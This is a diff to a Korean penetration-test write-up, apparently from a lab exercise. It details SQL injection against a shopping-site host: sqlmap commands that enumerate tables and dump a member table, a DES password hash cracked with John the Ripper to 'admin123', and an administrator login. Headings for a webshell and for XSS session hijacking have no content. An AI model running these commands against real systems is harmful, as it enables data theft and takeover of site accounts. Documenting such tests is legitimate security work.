@@ -90,29 +90,66 @@
     - **limit 2,1:** `mysql`
     - **limit 3,1:** `phpmyadmin`
     - **limit 4,1:** `test_db`
+
+#### **4단계: 타겟 DB 선정 및 테이블 탐색 (Table Enumeration)**
+
+식별된 여러 데이터베이스 중 실제 서비스 데이터가 집약된 타겟을 선정하고, 그 내부 구조를 파악하는 단계입니다.
+
+- **판단 및 타겟 선정:** `information_schema`, `mysql` 등 시스템 DB를 제외하고, 실제 웹 서비스의 핵심 데이터가 포함되었을 것으로 판단되는 **`fsk_m_db`**를 최종 타겟으로 선정함.
+
+- **분석 방법:** `fsk_m_db` 내에 존재하는 전체 테이블 목록을 호출하여 관리자 및 회원 정보와 관련된 테이블을 탐색함.
+
+- **명령어:** `sqlmap -u "http://192.168.20.123/m_mall_detail.php?ps_ctid=03070000&ps_goid=1" -D fsk_m_db --tables --batch`
+![[SQL_Injection_취약점탐색5.png]]
+- **분석 결과:** 총 37개의 테이블이 확인되었으며, 명명 규칙상 회원 정보와 권한 체계가 포함될 가능성이 가장 높은 **`morning_member_table`**을 집중 분석 대상으로 확정함.
+
 ---
 
+#### **5단계: morning_member_table 데이터 구조 및 권한 체계 분석**
 
+선정된 테이블의 상세 데이터를 추출하여 계정 체계와 권한 등급 시스템을 파악하는 단계입니다.
 
+- **분석 방법:** 해당 테이블의 전체 데이터를 덤프(Dump)하여 사용자별 등급을 비교 분석함.
 
+- **명령어:** `sqlmap -u "http://192.168.20.123/m_mall_detail.php?ps_ctid=03070000&ps_goid=1" -D fsk_m_db -T morning_member_table --dump --batch`
+![[SQL_Injection_취약점탐색6_1.png]]
+- **분석 결과:** 
+	* 다수의 회원 데이터 중 ID가 **`coreadmin`**인 계정 식별.
+    - 일반 사용자의 `member_class`는 1~3인 반면, `coreadmin` 계정은 **`10`**으로 설정되어 있음을 확인. 이를 통해 해당 시스템은 `member_class`가 **10일 때 최고 관리자 권한**을 부여하는 구조임을 파악함.
 
+#### **6단계: 패스워드 해시 추출 및 존더리퍼(John the Ripper) 크래킹**
 
+탈취한 최고 관리자 계정의 암호화된 비밀번호를 평문으로 복구하여 침투 가능성을 검증하는 단계입니다.
+![[SQL_Injection_취약점탐색6_2.png]]
+- **추출 데이터:** `member_id: coreadmin` / `member_pass: mo7sLvDuVNZJ2`
 
+- **해시 분석:** 패스워드 패턴 분석 결과, Salt값(`mo`)이 포함된 **Unix DES(descrypt)** 방식의 해시임을 식별함.
 
+- **크래킹 수행:** 
+	1. 해시 파일 생성: `echo 'coreadmin:mo7sLvDuVNZJ2' > hash.txt`
+	2. 존더리퍼 실행: `john --format=descrypt hash.txt`
 
+![[SQL_Injection_취약점탐색7.png]]
+- **최종 결과:** **`coreadmin:admin123`**
 
+### **7단계: 관리자 권한 탈취 및 침투 실증 (Final Impact)**
 
+확보한 계정 정보를 통해 실제 웹 애플리케이션의 제어권을 획득하는 최종 단계입니다.
 
+- **실행 내용:** 관리자 로그인 페이지에 접속하여 탈취한 `coreadmin / admin123` 정보로 인증 시도.
+- **최종 결과:** 
+	- **최고 관리자 권한으로 로그인 성공.**
+![[SQL_Injection_취약점탐색8.png]]
+	- 관리자 대시보드를 통한 사이트 설정 변경 및 서비스 전체 제어권 획득 확인.
+![[SQL_Injection_취약점탐색9.png]]
 
-
-
-
-
-
-
-
-
+---
 
 ### 1.2 파일 업로드 취약점을 통한 리버스 쉘 (WebShell)
+
+
+
+
+---
 ### 1.3 XSS를 통한 세션 하이재킹 (Session Hijacking)
 
